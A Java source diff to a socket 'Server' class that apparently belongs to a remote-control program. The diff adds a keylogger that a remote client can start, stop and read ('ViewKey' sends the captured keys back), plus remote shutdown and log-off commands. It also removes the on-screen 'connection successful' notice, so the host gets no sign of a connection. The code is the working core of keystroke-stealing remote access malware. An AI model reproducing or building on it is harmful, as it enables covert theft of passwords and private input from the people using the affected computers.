@@ -15,6 +15,7 @@ public class Server {
     public Socket clientSocket;
     private DataOutputStream dataOutputStream;
     private DataInputStream dataInputStream;
+    private KeyLogger keyLogger;
 
     Server() {
         try {
@@ -30,6 +31,7 @@ public class Server {
             Close();
         try {
             this.serverSocket = new ServerSocket(port);
+            this.keyLogger = new KeyLogger();
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -57,14 +59,28 @@ public class Server {
     public void AcceptConnection() {
         while (true) {
             try {
-                this.clientSocket = this.serverSocket.accept();
-                JOptionPane.showMessageDialog(null, "Kết nối thành công");
-                this.dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());
-                this.dataInputStream = new DataInputStream(clientSocket.getInputStream());
+                if (!IsConnected()) {
+                    this.clientSocket = this.serverSocket.accept();
+                    this.dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());
+                    this.dataInputStream = new DataInputStream(clientSocket.getInputStream());
+                }
                 String cmdString = ReceiveCommand();
                 if (cmdString.equalsIgnoreCase("ShutDown")) {
-                    System.out.println(cmdString);
-                    SendCommand("Accept");
+                    SendCommand("Shutdown");
+                    ComputerController.ShutDown();
+                } else if (cmdString.equalsIgnoreCase("LogOff")) {
+                    SendCommand("Logout");
+                    ComputerController.LogOut();
+                } else if (cmdString.equalsIgnoreCase("StartHook")) {
+                    SendCommand("StartHook");
+                    this.keyLogger.StartHooking();
+                } else if (cmdString.equalsIgnoreCase("StopHooking")) {
+                    SendCommand("StopHook");
+                    this.keyLogger.StopHooking();
+                } else if (cmdString.equalsIgnoreCase("ViewKey")) {
+                    SendData("ViewKey", keyLogger.GetKey());
+                } else {
+                    SendCommand("None");
                 }
             } catch (IOException e) {
                 e.printStackTrace();
@@ -73,6 +89,8 @@ public class Server {
     }
 
     public boolean IsConnected() {
+        if (this.clientSocket == null)
+            return false;
         return this.clientSocket.isConnected();
     }
 
@@ -81,8 +99,11 @@ public class Server {
             return "None";
         }
         try {
+            this.dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());
+            this.dataInputStream = new DataInputStream(clientSocket.getInputStream());
             String cmd = dataInputStream.readUTF();
             if (cmd != null) {
+                System.out.println(cmd);
                 return cmd;
             }
         } catch (IOException e) {
@@ -92,8 +113,12 @@ public class Server {
     }
 
     public Object ReceiveData() {
+        if (!IsConnected())
+            return null;
         Object obj;
         try {
+            this.dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());
+            this.dataInputStream = new DataInputStream(clientSocket.getInputStream());
             ObjectInputStream objectInputStream = new ObjectInputStream(dataInputStream);
             obj = objectInputStream.readObject();
             return obj;
@@ -106,7 +131,11 @@ public class Server {
     }
 
     public void SendData(String cmd, Object obj) {
+        if (!IsConnected())
+            return;
         try {
+            this.dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());
+            this.dataInputStream = new DataInputStream(clientSocket.getInputStream());
             dataOutputStream.writeUTF(cmd);
             ObjectOutputStream objectOutputStream = new ObjectOutputStream(dataOutputStream);
             objectOutputStream.writeObject(obj);
@@ -117,11 +146,14 @@ public class Server {
     }
 
     public void SendCommand(String cmd) {
+        if (!IsConnected())
+            return;
         try {
+            this.dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());
+            this.dataInputStream = new DataInputStream(clientSocket.getInputStream());
             dataOutputStream.writeUTF(cmd);
             dataOutputStream.flush();
         } catch (IOException e) {
-            // TODO Auto-generated catch block
             e.printStackTrace();
         }
     }
